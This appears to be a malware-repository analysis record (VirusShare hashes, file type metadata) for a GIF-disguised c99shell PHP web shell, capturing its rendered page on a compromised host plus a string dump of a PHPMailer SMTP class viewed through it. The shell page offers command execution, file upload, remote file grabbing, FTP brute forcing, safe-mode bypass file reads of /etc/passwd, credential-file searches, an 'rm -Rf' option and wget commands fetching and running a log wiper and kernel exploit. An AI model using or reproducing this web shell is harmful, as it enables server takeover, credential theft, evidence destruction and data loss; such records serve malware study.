style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/classes/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0108 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_1ebd02f8a9998e3a20e8739696bba955",
    "filesize": 42258,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "1ebd02f8a9998e3a20e8739696bba955",
        "sha1": "05730d9305984d2f7117d062910e1d181f4e2413",
        "sha256": "1d61f99b18035d7b58a0b39302565009a9cbd92938cac02a0e81dc2f742d4b76"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F&sort=0a\"><b>classes/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.56 GB of 389.31 GB (61.79%)</b><br><b>Your ip: <a href=http://87.177.159.26>87.177.159.26</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[php]&nbsp;class.smtp.php (32.74 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=class.smtp.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><font color=green>[Code]</font></a> (<a href=\"?act=f&f=class.smtp.php&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b><u>[Session]</u></b></a> (<a href=\"?act=f&f=class.smtp.php&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre><?php",
            "////////////////////////////////////////////////////",
            "// SMTP - PHP SMTP class",
            "// Version 1.02",
            "// Define an SMTP class that can be used to connect",
            "// and communicate with any SMTP server. It implements",
            "// all the SMTP functions defined in RFC821 except TURN.",
            "// Author: Chris Ryan",
            "// License: LGPL, see LICENSE",
            "////////////////////////////////////////////////////",
            " * SMTP is rfc 821 compliant and implements all the rfc 821 SMTP",
            " * commands except TURN which will always return a not implemented",
            " * error. SMTP also provides some utility methods for sending mail",
            " * to an SMTP server.",
            " * @package PHPMailer",
            " * @author Chris Ryan",
            "class SMTP",
            "    /**",
            "     *  SMTP server port",
            "     *  @var int",
            "     */",
            "    var $SMTP_PORT = 25;",
            "    ",
            "    /**",
            "     *  SMTP reply line ending",
            "     *  @var string",
            "     */",
            "    var $CRLF = \"\\r\\n\";",
            "    ",
            "    /**",
            "     *  Sets whether debugging is turned on",
            "     *  @var bool",
            "     */",
            "    var $do_debug;       # the level of debug to perform",
            "    /**#@+",
            "     * @access private",
            "     */",
            "    var $smtp_conn;      # the socket to the server",
            "    var $error;          # error if any on the last call",
            "    var $helo_rply;      # the reply the server sent to us for HELO",
            "    /**#@-*/",
            "    /**",
            "     * Initialize the class so that the data is in a known state.",
            "     * @access public",
            "     * @return void",
            "     */",
            "    function SMTP() {",
            "        $this->smtp_conn = 0;",
            "        $this->error = null;",
            "        $this->helo_rply = null;",
            "        $this->do_debug = 0;",
            "    }",
            "    /*************************************************************",
            "     *                    CONNECTION FUNCTIONS                  *",
            "     ***********************************************************/",
            "    /**",
            "     * Connect to the server specified on the port specified.",
            "     * If the port is not specified use the default SMTP_PORT.",
            "     * If tval is specified then a connection will try and be",
            "     * established with the server for that number of seconds.",
            "     * If tval is not specified the default is 30 seconds to",
            "     * try on the connection.",
            "     *",
            "     * SMTP CODE SUCCESS: 220",
            "     * SMTP CODE FAILURE: 421",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Connect($host,$port=0,$tval=30) {",
            "        # set the error val to null so there is no confusion",
            "        $this->error = null;",
            "        # make sure we are __not__ connected",
            "        if($this->connected()) {",
            "            # ok we are connected! what should we do?",
            "            # for now we will just give an error saying we",
            "            # are already connected",
            "            $this->error =",
            "                array(\"error\" => \"Already connected to a server\");",
            "            return false;",
            "        }",
            "        if(empty($port)) {",
            "            $port = $this->SMTP_PORT;",
            "        }",
            "        #connect to the smtp server",
            "        $this->smtp_conn = fsockopen($host,    # the host of the server",
            "                                     $port,    # the port to use",
            "                                     $errno,   # error number if any",
            "                                     $errstr,  # error message if any",
            "                                     $tval);   # give up after ? secs",
            "        # verify we connected properly",
            "        if(empty($this->smtp_conn)) {",
            "            $this->error = array(\"error\" => \"Failed to connect to server\",",
            "                                 \"errno\" => $errno,",
            "                                 \"errstr\" => $errstr);",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": $errstr ($errno)\" . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        # sometimes the SMTP server takes a little longer to respond",
            "        # so we will give it a longer timeout for the first read",
            "        // Windows still does not have support for this timeout function",
            "        if(substr(PHP_OS, 0, 3) != \"WIN\")",
            "           socket_set_timeout($this->smtp_conn, $tval, 0);",
            "        # get any announcement stuff",
            "        $announce = $this->get_lines();",
            "        # set the timeout  of any socket functions at 1/10 of a second",
            "        //if(function_exists(\"socket_set_timeout\"))",
            "        //   socket_set_timeout($this->smtp_conn, 0, 100000);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $announce;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Performs SMTP authentication.  Must be run after running the",
            "     * Hello() method.  Returns true if successfully authenticated.",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Authenticate($username, $password) {",
            "        // Start authentication",
            "        fputs($this->smtp_conn,\"AUTH LOGIN\" . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($code != 334) {",
            "            $this->error =",
            "                array(\"error\" => \"AUTH not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        // Send encoded username",
            "        fputs($this->smtp_conn, base64_encode($username) . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($code != 334) {",
            "            $this->error =",
            "                array(\"error\" => \"Username not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        // Send encoded password",
            "        fputs($this->smtp_conn, base64_encode($password) . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($code != 235) {",
            "            $this->error =",
            "                array(\"error\" => \"Password not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Returns true if connected to a server otherwise false",
            "     * @access private",
            "     * @return bool",
            "     */",
            "    function Connected() {",
            "        if(!empty($this->smtp_conn)) {",
            "            $sock_status = socket_get_status($this->smtp_conn);",
            "            if($sock_status[\"eof\"]) {",
            "                # hmm this is an odd situation... the socket is",
            "                # valid but we aren't connected anymore",
            "                if($this->do_debug >= 1) {",
            "                    echo \"SMTP -> NOTICE:\" . $this->CRLF .",
            "                         \"EOF caught while checking if connected\";",
            "                }",
            "                $this->Close();",
            "                return false;",
            "            }",
            "            return true; # everything looks good",
            "        }",
            "        return false;",
            "    }",
            "    /**",
            "     * Closes the socket and cleans up the state of the class.",
            "     * It is not considered good to use this function without",
            "     * first trying to use QUIT.",
            "     * @access public",
            "     * @return void",
            "     */",
            "    function Close() {",
            "        $this->error = null; # so there is no confusion",
            "        $this->helo_rply = null;",
            "        if(!empty($this->smtp_conn)) {",
            "            # close the connection and cleanup",
            "            fclose($this->smtp_conn);",
            "            $this->smtp_conn = 0;",
            "        }",
            "    }",
            "    /***************************************************************",
            "     *                        SMTP COMMANDS                       *",
            "     *************************************************************/",
            "    /**",
            "     * Issues a data command and sends the msg_data to the server",
            "     * finializing the mail transaction. $msg_data is the message",
            "     * that is to be send with the headers. Each header needs to be",
            "     * on a single line followed by a <CRLF> with the message headers",
            "     * and the message body being seperated by and additional <CRLF>.",
            "     *",
            "     * Implements rfc 821: DATA <CRLF>",
            "     *",
            "     * SMTP CODE INTERMEDIATE: 354",
            "     *     [data]",
            "     *     <CRLF>.<CRLF>",
            "     *     SMTP CODE SUCCESS: 250",
            "     *     SMTP CODE FAILURE: 552,554,451,452",
            "     * SMTP CODE FAILURE: 451,554",
            "     * SMTP CODE ERROR  : 500,501,503,421",
            "     * @access public",
